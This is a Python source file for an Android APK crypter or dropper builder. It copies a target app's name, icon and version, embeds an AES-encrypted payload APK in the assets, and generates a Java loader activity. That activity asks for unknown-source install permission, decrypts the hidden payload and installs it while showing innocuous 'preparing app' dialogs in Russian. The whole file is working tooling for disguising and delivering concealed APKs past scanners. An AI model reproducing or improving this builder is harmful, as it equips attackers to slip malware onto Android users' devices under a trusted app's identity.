import logging
import os
import shutil
import subprocess
import zipfile
from pathlib import Path
from xml.sax.saxutils import escape

logger = logging.getLogger(__name__)


class StubBuilder:
    def __init__(self):
        self.android_home = None
        self.build_tools = None
        self.platform = None
        self.aapt_path = None
        self.d8_path = None
        self.apksigner_path = None
        self.zipalign_path = None
        self.javac_path = None
        self.keytool_path = None
        self.keystore = None
        self.keystore_pass = os.getenv("ANDROID_KEYSTORE_PASS", "android")
        self.key_alias = os.getenv("ANDROID_KEY_ALIAS")
        self.temp_dir = Path("temp/stub_build")
        self.temp_dir.mkdir(parents=True, exist_ok=True)
        logger.info("StubBuilder initialized")

    @staticmethod
    def _pick_highest_version(paths: list[Path]) -> Path | None:
        if not paths:
            return None

        def sort_key(path: Path):
            parts = []
            for item in path.name.replace("-", ".").split("."):
                parts.append(int(item) if item.isdigit() else item)
            return parts

        return sorted(paths, key=sort_key, reverse=True)[0]

    @staticmethod
    def _first_existing_path(candidates: list[Path]) -> Path | None:
        for candidate in candidates:
            if candidate and candidate.exists():
                return candidate
        return None

    @staticmethod
    def _which(candidates: list[str]) -> str | None:
        for candidate in candidates:
            resolved = shutil.which(candidate)
            if resolved:
                return resolved
        return None

    def _find_android_home(self) -> Path | None:
        env_candidates = [
            os.getenv("ANDROID_HOME"),
            os.getenv("ANDROID_SDK_ROOT"),
        ]
        for value in env_candidates:
            if value:
                candidate = Path(value).expanduser()
                if candidate.exists():
                    return candidate

        home = Path.home()
        local_app_data = os.getenv("LOCALAPPDATA")
        path_candidates = [
            Path(local_app_data) / "Android" / "Sdk" if local_app_data else None,
            home / "AppData" / "Local" / "Android" / "Sdk",
            home / "Android" / "Sdk",
            home / "Android" / "sdk",
            home / "Library" / "Android" / "sdk",
            Path("/opt/android-sdk"),
        ]
        return self._first_existing_path([p for p in path_candidates if p is not None])

    def _find_build_tools_dir(self, android_home: Path) -> Path | None:
        build_tools_root = android_home / "build-tools"
        if not build_tools_root.exists():
            return None
        return self._pick_highest_version([p for p in build_tools_root.iterdir() if p.is_dir()])

    def _find_platform_dir(self, android_home: Path) -> Path | None:
        platforms_root = android_home / "platforms"
        if not platforms_root.exists():
            return None
        return self._pick_highest_version([p for p in platforms_root.iterdir() if p.is_dir()])

    def _resolve_tool_from_dir(self, base_dir: Path | None, names: list[str]) -> str | None:
        if base_dir:
            for name in names:
                candidate = base_dir / name
                if candidate.exists():
                    return str(candidate)
        return self._which(names)

    def _resolve_java_tool(self, tool_name: str) -> str | None:
        java_home = os.getenv("JAVA_HOME")
        candidates = []
        if java_home:
            java_bin = Path(java_home) / "bin"
            candidates.extend(
                [
                    str(java_bin / f"{tool_name}.exe"),
                    str(java_bin / f"{tool_name}.bat"),
                    str(java_bin / tool_name),
                ]
            )

        for candidate in candidates:
            if Path(candidate).exists():
                return candidate

        return self._which([f"{tool_name}.exe", f"{tool_name}.bat", tool_name])

    def _resolve_keystore(self) -> tuple[Path, bool]:
        env_keystore = os.getenv("ANDROID_KEYSTORE")
        if env_keystore:
            return Path(env_keystore).expanduser(), False

        debug_keystore = Path.home() / ".android" / "debug.keystore"
        return debug_keystore, True

    def _ensure_debug_keystore(self, keystore_path: Path):
        if keystore_path.exists():
            return

        keystore_path.parent.mkdir(parents=True, exist_ok=True)
        if not self.keytool_path:
            raise RuntimeError(
                "Android keystore not found and keytool is unavailable. "
                "Set ANDROID_KEYSTORE or install a JDK with keytool."
            )

        cmd = [
            self.keytool_path,
            "-genkeypair",
            "-v",
            "-keystore",
            str(keystore_path),
            "-storepass",
            "android",
            "-alias",
            "androiddebugkey",
            "-keypass",
            "android",
            "-keyalg",
            "RSA",
            "-keysize",
            "2048",
            "-validity",
            "10000",
            "-dname",
            "CN=Android Debug,O=Android,C=US",
        ]
        subprocess.run(cmd, check=True, capture_output=True, text=True)

    def _ensure_toolchain(self):
        if all(
            [
                self.android_home,
                self.build_tools,
                self.platform,
                self.aapt_path,
                self.d8_path,
                self.apksigner_path,
                self.zipalign_path,
                self.javac_path,
                self.keystore,
            ]
        ):
            return

        android_home = self._find_android_home()
        if not android_home:
            raise RuntimeError(
                "Android SDK not found. Set ANDROID_HOME or ANDROID_SDK_ROOT "
                "to your SDK path."
            )

        build_tools_dir = self._find_build_tools_dir(android_home)
        if not build_tools_dir:
            raise RuntimeError(f"Android build-tools not found under {android_home}.")

        platform_dir = self._find_platform_dir(android_home)
        if not platform_dir or not (platform_dir / "android.jar").exists():
            raise RuntimeError(f"Android platform with android.jar not found under {android_home}.")

        self.android_home = str(android_home)
        self.build_tools = str(build_tools_dir)
        self.platform = str(platform_dir)
        self.aapt_path = self._resolve_tool_from_dir(build_tools_dir, ["aapt.exe", "aapt"])
        self.d8_path = self._resolve_tool_from_dir(build_tools_dir, ["d8.bat", "d8.cmd", "d8"])
        self.apksigner_path = self._resolve_tool_from_dir(
            build_tools_dir,
            ["apksigner.bat", "apksigner.cmd", "apksigner"],
        )
        self.zipalign_path = self._resolve_tool_from_dir(build_tools_dir, ["zipalign.exe", "zipalign"])
        self.javac_path = self._resolve_java_tool("javac")
        self.keytool_path = self._resolve_java_tool("keytool")

        missing = []
        for label, value in [
            ("aapt", self.aapt_path),
            ("d8", self.d8_path),
            ("apksigner", self.apksigner_path),
            ("zipalign", self.zipalign_path),
            ("javac", self.javac_path),
        ]:
            if not value:
                missing.append(label)

        if missing:
            raise RuntimeError(f"Missing required Android build tools: {', '.join(missing)}.")

        keystore_path, uses_debug_keystore = self._resolve_keystore()
        if uses_debug_keystore:
            self._ensure_debug_keystore(keystore_path)
            if not self.key_alias:
                self.key_alias = "androiddebugkey"
            if "ANDROID_KEYSTORE_PASS" not in os.environ:
                self.keystore_pass = "android"
        else:
            if not keystore_path.exists():
                raise RuntimeError(f"Configured keystore not found: {keystore_path}")
            if not self.key_alias:
                self.key_alias = "mykey"

        self.keystore = str(keystore_path)

    @staticmethod
    def _extract_named_value(line: str, key: str):
        marker = f"{key}='"
        start = line.find(marker)
        if start == -1:
            return None

        start += len(marker)
        end = line.find("'", start)
        if end == -1:
            return None

        return line[start:end]

    @staticmethod
    def _extract_first_quoted_value(line: str):
        parts = line.split("'")
        if len(parts) >= 2:
            return parts[1]
        return None

    @staticmethod
    def _append_icon_candidate(candidates: list[str], icon_path: str | None):
        if icon_path and icon_path not in candidates:
            candidates.append(icon_path)

    @staticmethod
    def _icon_priority(path: str):
        lowered = path.lower()
        density_order = [
            "xxxhdpi",
            "xxhdpi",
            "xhdpi",
            "anydpi",
            "hdpi",
            "mdpi",
            "drawable",
            "ldpi",
        ]
        extension_order = {
            ".png": 4,
            ".webp": 3,
            ".jpg": 2,
            ".jpeg": 2,
        }

        density_score = 0
        for index, token in enumerate(density_order):
            if token in lowered:
                density_score = len(density_order) - index
                break

        extension_score = extension_order.get(Path(path).suffix.lower(), 0)
        return density_score, extension_score, len(path)

    @staticmethod
    def _java_escape(value: str) -> str:
        return (
            str(value or "")
            .replace("\\", "\\\\")
            .replace('"', '\\"')
            .replace("\n", "\\n")
        )

    @staticmethod
    def _xml_text(value: str) -> str:
        return escape(str(value or ""))

    @staticmethod
    def _xml_attr(value: str) -> str:
        return escape(str(value or ""), {'"': "&quot;"})

    def _find_best_icon_path(self, zip_ref: zipfile.ZipFile, apk_info: dict):
        supported_extensions = {".png", ".webp", ".jpg", ".jpeg"}
        archive_names = zip_ref.namelist()
        archive_name_set = set(archive_names)

        for candidate in apk_info["icon_candidates"]:
            if (
                candidate in archive_name_set
                and Path(candidate).suffix.lower() in supported_extensions
            ):
                return candidate

        icon_stems = {
            Path(candidate).stem
            for candidate in apk_info["icon_candidates"]
            if candidate
        }
        icon_stems.update({"ic_launcher", "app_icon"})

        fallback_icons = []
        for name in archive_names:
            suffix = Path(name).suffix.lower()
            if not name.startswith("res/") or suffix not in supported_extensions:
                continue

            stem = Path(name).stem
            if stem in icon_stems or "ic_launcher" in stem:
                fallback_icons.append(name)

        if not fallback_icons:
            return None

        fallback_icons.sort(key=self._icon_priority, reverse=True)
        return fallback_icons[0]

    def extract_apk_info(self, apk_path: str) -> dict:
        logger.info("Extracting APK metadata: %s", apk_path)
        info = {
            "package": "com.app",
            "label": Path(apk_path).stem,
            "version_code": "1",
            "version_name": "1.0",
            "min_sdk": "21",
            "target_sdk": "34",
            "icon": None,
            "icon_candidates": [],
            "original_filename": Path(apk_path).name,
        }

        try:
            self._ensure_toolchain()
        except RuntimeError as exc:
            logger.warning("Android toolchain unavailable while reading APK metadata: %s", exc)
            return info

        cmd = [self.aapt_path, "dump", "badging", apk_path]
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode != 0:
            logger.warning("aapt dump badging failed: %s", result.stderr.strip())

        for line in result.stdout.splitlines():
            if line.startswith("package:"):
                info["package"] = self._extract_named_value(line, "name") or info["package"]
                info["version_code"] = (
                    self._extract_named_value(line, "versionCode") or info["version_code"]
                )
                info["version_name"] = (
                    self._extract_named_value(line, "versionName") or info["version_name"]
                )
            elif line.startswith("sdkVersion:"):
                info["min_sdk"] = self._extract_first_quoted_value(line) or info["min_sdk"]
            elif line.startswith("targetSdkVersion:"):
                info["target_sdk"] = (
                    self._extract_first_quoted_value(line) or info["target_sdk"]
                )
            elif line.startswith("application-label:"):
                info["label"] = self._extract_first_quoted_value(line) or info["label"]
            elif line.startswith("application:"):
                info["label"] = self._extract_named_value(line, "label") or info["label"]
                self._append_icon_candidate(
                    info["icon_candidates"],
                    self._extract_named_value(line, "icon"),
                )
            elif line.startswith("application-icon"):
                self._append_icon_candidate(
                    info["icon_candidates"],
                    self._extract_first_quoted_value(line),
                )

        if info["icon_candidates"]:
            info["icon"] = info["icon_candidates"][0]

        logger.info(
            "APK info: package=%s, label=%s, version=%s(%s), icon=%s",
            info["package"],
            info["label"],
            info["version_name"],
            info["version_code"],
            info["icon"],
        )
        return info

    def extract_resources(self, apk_path: str, project_dir: Path, apk_info: dict):
        icon_extracted = False

        try:
            with zipfile.ZipFile(apk_path, "r") as zip_ref:
                icon_path = self._find_best_icon_path(zip_ref, apk_info)
                if icon_path:
                    icon_data = zip_ref.read(icon_path)
                    suffix = Path(icon_path).suffix.lower() or ".png"
                    mipmap_dir = project_dir / "res" / "mipmap"
                    mipmap_dir.mkdir(parents=True, exist_ok=True)

                    with open(mipmap_dir / f"ic_launcher{suffix}", "wb") as f:
                        f.write(icon_data)
                    with open(mipmap_dir / f"ic_launcher_round{suffix}", "wb") as f:
                        f.write(icon_data)

                    icon_extracted = True
                    logger.info("Copied original icon resource: %s", icon_path)
        except Exception as exc:
            logger.warning("Failed to extract icon from APK: %s", exc)

        if not icon_extracted:
            mipmap_dir = project_dir / "res" / "mipmap"
            mipmap_dir.mkdir(parents=True, exist_ok=True)

            xml_icon = """<?xml version="1.0" encoding="utf-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android"
    android:shape="rectangle">
    <solid android:color="#4CAF50"/>
    <corners android:radius="8dp"/>
</shape>"""
            with open(mipmap_dir / "ic_launcher.xml", "w", encoding="utf-8") as f:
                f.write(xml_icon)
            with open(mipmap_dir / "ic_launcher_round.xml", "w", encoding="utf-8") as f:
                f.write(xml_icon)

    def build_stub_apk(self, aes_key_hex: str, original_apk_path: str, encrypted_payload: bytes) -> str:
        logger.info("Starting stub build, payload size: %s bytes", len(encrypted_payload))
        self._ensure_toolchain()
        apk_info = self.extract_apk_info(original_apk_path)

        project_dir = self.temp_dir / "stub_project"
        if project_dir.exists():
            shutil.rmtree(project_dir)

        logger.info("Creating stub project structure: %s", project_dir)

        (project_dir / "src" / "com" / "loader").mkdir(parents=True)
        (project_dir / "res" / "values").mkdir(parents=True)
        (project_dir / "res" / "mipmap").mkdir(parents=True)
        (project_dir / "res" / "xml").mkdir(parents=True)
        (project_dir / "assets").mkdir(parents=True)

        self.extract_resources(original_apk_path, project_dir, apk_info)

        payload_file = project_dir / "assets" / "payload.bin"
        with open(payload_file, "wb") as f:
            f.write(encrypted_payload)
        logger.info("Payload saved: %s", payload_file)

        loader_code = self.generate_loader_activity(aes_key_hex, apk_info)
        with open(
            project_dir / "src" / "com" / "loader" / "LoaderActivity.java",
            "w",
            encoding="utf-8",
        ) as f:
            f.write(loader_code)

        manifest = self.generate_manifest(apk_info)
        with open(project_dir / "AndroidManifest.xml", "w", encoding="utf-8") as f:
            f.write(manifest)

        strings_xml = f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">{self._xml_text(apk_info["label"])}</string>
</resources>"""
        with open(project_dir / "res" / "values" / "strings.xml", "w", encoding="utf-8") as f:
            f.write(strings_xml)

        file_paths_xml = """<?xml version="1.0" encoding="utf-8"?>
<paths xmlns:android="http://schemas.android.com/apk/res/android">
    <cache-path name="cache" path="." />
    <files-path name="files" path="." />
    <external-files-path name="external_files" path="." />
</paths>"""
        with open(project_dir / "res" / "xml" / "file_paths.xml", "w", encoding="utf-8") as f:
            f.write(file_paths_xml)

        logger.info("Compiling Java sources")
        self.compile_java(project_dir)

        logger.info("Converting classes to DEX")
        self.convert_to_dex(project_dir)

        logger.info("Packaging APK")
        unsigned_apk = self.package_apk(project_dir)

        logger.info("Signing APK")
        signed_apk = self.sign_apk(unsigned_apk)
        logger.info("Stub APK built: %s", signed_apk)
        return signed_apk

    def compile_java(self, project_dir: Path):
        src_file = project_dir / "src" / "com" / "loader" / "LoaderActivity.java"
        output_dir = project_dir / "bin" / "classes"
        output_dir.mkdir(parents=True, exist_ok=True)

        cmd = [
            self.javac_path,
            "-source",
            "1.8",
            "-target",
            "1.8",
            "-bootclasspath",
            f"{self.platform}/android.jar",
            "-d",
            str(output_dir),
            str(src_file),
        ]

        subprocess.run(cmd, check=True)

    def convert_to_dex(self, project_dir: Path):
        classes_dir = project_dir / "bin" / "classes"
        class_files = list(classes_dir.rglob("*.class"))
        if not class_files:
            raise RuntimeError("Java compilation produced no .class files.")

        cmd = [
            self.d8_path,
            "--lib",
            f"{self.platform}/android.jar",
            "--output",
            str(project_dir / "bin"),
            *[str(f) for f in class_files],
        ]

        subprocess.run(cmd, check=True)

    def package_apk(self, project_dir: Path) -> str:
        unsigned_apk = project_dir / "stub_unsigned.apk"
        dex_file = project_dir / "bin" / "classes.dex"
        assets_dir = project_dir / "assets"

        cmd = [
            self.aapt_path,
            "package",
            "-f",
            "-M",
            str(project_dir / "AndroidManifest.xml"),
            "-S",
            str(project_dir / "res"),
            "-A",
            str(assets_dir),
            "-I",
            f"{self.platform}/android.jar",
            "-F",
            str(unsigned_apk),
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"aapt package failed: {result.stderr}")

        with zipfile.ZipFile(str(unsigned_apk), "a", compression=zipfile.ZIP_DEFLATED) as apk_zip:
            apk_zip.write(str(dex_file), "classes.dex")

        return str(unsigned_apk)

    def sign_apk(self, unsigned_apk: str) -> str:
        aligned_apk = unsigned_apk.replace("_unsigned.apk", "_aligned.apk")
        signed_apk = unsigned_apk.replace("_unsigned.apk", "_signed.apk")

        cmd = [
            self.zipalign_path,
            "-f",
            "4",
            unsigned_apk,
            aligned_apk,
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"zipalign failed: {result.stderr}")

        cmd = [
            self.apksigner_path,
            "sign",
            "--ks",
            self.keystore,
            "--ks-pass",
            f"pass:{self.keystore_pass}",
            "--ks-key-alias",
            self.key_alias,
            "--key-pass",
            f"pass:{self.keystore_pass}",
            "--out",
            signed_apk,
            aligned_apk,
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"apksigner sign failed: {result.stderr}")

        cmd = [self.apksigner_path, "verify", signed_apk]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"APK signature verification failed: {result.stderr}")

        return signed_apk

    def generate_loader_activity(self, aes_key_hex: str, apk_info: dict) -> str:
        output_apk_name = self._java_escape(apk_info["original_filename"])
        app_label = self._java_escape(apk_info["label"])
        original_package = self._java_escape(apk_info["package"])
        payload_magic = "CRUPTOANON"
        payload_aad = "CRUPTOANON:v1"
        payload_version = 1

        return f'''package com.loader;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.content.pm.PackageInstaller;
import java.io.*;
import java.nio.charset.StandardCharsets;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class LoaderActivity extends Activity {{

    private static final byte[] AES_KEY = hexToBytes("{aes_key_hex}");
    private static final byte[] PAYLOAD_MAGIC = "{payload_magic}".getBytes(StandardCharsets.US_ASCII);
    private static final byte PAYLOAD_VERSION = (byte) {payload_version};
    private static final byte[] PAYLOAD_AAD = "{payload_aad}".getBytes(StandardCharsets.US_ASCII);
    private static final String OUTPUT_APK_NAME = "{output_apk_name}";
    private static final String APP_LABEL = "{app_label}";
    private static final String ORIGINAL_PACKAGE_NAME = "{original_package}";
    private File apkFile;

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);

        Intent launchIntent = getIntent();
        if (handleInstallCommitIntent(launchIntent)) {{
            return;
        }}

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {{
            if (!getPackageManager().canRequestPackageInstalls()) {{
                startActivityForResult(
                    new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
                        .setData(Uri.parse("package:" + getPackageName())),
                    1234
                );
                return;
            }}
        }}

        startDecryption();
    }}

    @Override
    protected void onNewIntent(Intent intent) {{
        super.onNewIntent(intent);
        setIntent(intent);
        handleInstallCommitIntent(intent);
    }}

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {{
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1234) {{
            startDecryption();
        }}
    }}

    private void startDecryption() {{
        final AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(APP_LABEL);
        builder.setMessage("Подготовка приложения...");
        builder.setCancelable(false);
        final AlertDialog dialog = builder.create();
        dialog.show();

        new Thread(new Runnable() {{
            @Override
            public void run() {{
                try {{
                    updateDialog(dialog, "Чтение данных...");

                    InputStream is = getAssets().open("payload.bin");
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = is.read(buffer)) != -1) {{
                        baos.write(buffer, 0, bytesRead);
                    }}
                    byte[] encryptedApk = baos.toByteArray();
                    is.close();

                    updateDialog(dialog, "Расшифровка (" + encryptedApk.length + " байт)...");

                    byte[] decryptedApk = decryptAES(encryptedApk);

                    updateDialog(dialog, "Сохранение (" + decryptedApk.length + " байт)...");

                    File apkDir = getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
                    if (apkDir == null) {{
                        apkDir = new File(getFilesDir(), "payload");
                    }}
                    if (!apkDir.exists() && !apkDir.mkdirs()) {{
                        throw new IOException("Не удалось создать директорию: " + apkDir.getAbsolutePath());
                    }}

                    apkFile = new File(apkDir, OUTPUT_APK_NAME);
                    FileOutputStream fos = new FileOutputStream(apkFile);
                    fos.write(decryptedApk);
                    fos.close();

                    new Handler(Looper.getMainLooper()).post(new Runnable() {{
                        @Override
                        public void run() {{
                            dialog.dismiss();
                            installApk();
                        }}
                    }});

                }} catch (final Exception e) {{
                    e.printStackTrace();
                    new Handler(Looper.getMainLooper()).post(new Runnable() {{
                        @Override
                        public void run() {{
                            dialog.dismiss();
                            showError(e.getMessage());
                        }}
                    }});
                }}
            }}
        }}).start();
    }}

    private void updateDialog(final AlertDialog dialog, final String message) {{
        new Handler(Looper.getMainLooper()).post(new Runnable() {{
            @Override
            public void run() {{
                dialog.setMessage(message);
            }}
        }});
    }}

    private void showError(final String error) {{
        AlertDialog.Builder errorBuilder = new AlertDialog.Builder(this);
        errorBuilder.setTitle("Ошибка");
        errorBuilder.setMessage("Не удалось загрузить приложение:\\n" + error);
        errorBuilder.setPositiveButton("OK", null);
        AlertDialog errorDialog = errorBuilder.create();
        errorDialog.setOnDismissListener(new android.content.DialogInterface.OnDismissListener() {{
            @Override
            public void onDismiss(android.content.DialogInterface d) {{
                finish();
            }}
        }});
        errorDialog.show();
    }}

    private boolean handleInstallCommitIntent(Intent intent) {{
        if (intent == null || !"INSTALL_COMMIT".equals(intent.getAction())) {{
            return false;
        }}

        int status = intent.getIntExtra(
            PackageInstaller.EXTRA_STATUS,
            PackageInstaller.STATUS_FAILURE
        );

        if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {{
            Intent confirmIntent = (Intent) intent.getParcelableExtra(Intent.EXTRA_INTENT);
            if (confirmIntent != null) {{
                startActivity(confirmIntent);
            }} else {{
                showError("Система запросила подтверждение установки, но intent отсутствует.");
            }}
            return true;
        }}

        if (status == PackageInstaller.STATUS_SUCCESS) {{
            launchInstalledApp();
            return true;
        }}

        String statusMessage = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
        if (statusMessage == null || statusMessage.trim().isEmpty()) {{
            statusMessage = "PackageInstaller status=" + status;
        }}

        showError("Установка не удалась: " + statusMessage);
        return true;
    }}

    private void launchInstalledApp() {{
        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(ORIGINAL_PACKAGE_NAME);
        if (launchIntent == null) {{
            finish();
            return;
        }}

        launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(launchIntent);
        finish();
    }}

    private byte[] decryptAES(byte[] encrypted) throws Exception {{
        if (encrypted.length < PAYLOAD_MAGIC.length + 1 + 12 + 16) {{
            throw new IOException("Payload too short");
        }}

        for (int i = 0; i < PAYLOAD_MAGIC.length; i++) {{
            if (encrypted[i] != PAYLOAD_MAGIC[i]) {{
                throw new IOException("Invalid payload header");
            }}
        }}

        int offset = PAYLOAD_MAGIC.length;
        if (encrypted[offset] != PAYLOAD_VERSION) {{
            throw new IOException("Unsupported payload version");
        }}
        offset += 1;

        byte[] nonce = new byte[12];
        System.arraycopy(encrypted, offset, nonce, 0, 12);
        offset += 12;

        byte[] tag = new byte[16];
        System.arraycopy(encrypted, offset, tag, 0, 16);
        offset += 16;

        byte[] ciphertext = new byte[encrypted.length - offset];
        System.arraycopy(encrypted, offset, ciphertext, 0, ciphertext.length);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec spec = new GCMParameterSpec(128, nonce);
        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(AES_KEY, "AES"), spec);
        cipher.updateAAD(PAYLOAD_AAD);

        byte[] input = new byte[ciphertext.length + tag.length];
        System.arraycopy(ciphertext, 0, input, 0, ciphertext.length);
        System.arraycopy(tag, 0, input, ciphertext.length, tag.length);

        return cipher.doFinal(input);
    }}

    private void installApk() {{
        PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
        PackageInstaller.Session session = null;

        try {{
            PackageInstaller.SessionParams params =
                new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            int sessionId = packageInstaller.createSession(params);
            session = packageInstaller.openSession(sessionId);

            try (
                InputStream in = new FileInputStream(apkFile);
                OutputStream out = session.openWrite("base.apk", 0, apkFile.length())
            ) {{
                byte[] buffer = new byte[8192];
                int c;
                while ((c = in.read(buffer)) != -1) {{
                    out.write(buffer, 0, c);
                }}
                session.fsync(out);
            }}

            Intent callbackIntent = new Intent(this, LoaderActivity.class);
            callbackIntent.setAction("INSTALL_COMMIT");
            int pendingIntentFlags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {{
                pendingIntentFlags |= PendingIntent.FLAG_MUTABLE;
            }}

            PendingIntent pendingIntent = PendingIntent.getActivity(
                this,
                sessionId,
                callbackIntent,
                pendingIntentFlags
            );

            session.commit(pendingIntent.getIntentSender());
            session.close();
        }} catch (Exception e) {{
            if (session != null) {{
                session.abandon();
            }}
            showError(e.getMessage());
        }}
    }}

    private static byte[] hexToBytes(String hex) {{
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {{
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                                 + Character.digit(hex.charAt(i + 1), 16));
        }}
        return data;
    }}
}}'''

    def generate_manifest(self, apk_info: dict) -> str:
        version_code = apk_info["version_code"]
        if not str(version_code).isdigit():
            version_code = "1"

        min_sdk = apk_info["min_sdk"] if str(apk_info["min_sdk"]).isdigit() else "21"
        target_sdk = apk_info["target_sdk"] if str(apk_info["target_sdk"]).isdigit() else "34"
        version_name = self._xml_attr(apk_info["version_name"])

        return f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.loader"
    android:versionCode="{version_code}"
    android:versionName="{version_name}">

    <uses-sdk
        android:minSdkVersion="{min_sdk}"
        android:targetSdkVersion="{target_sdk}"/>

    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>

    <application
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:allowBackup="false">

        <activity android:name=".LoaderActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>"""
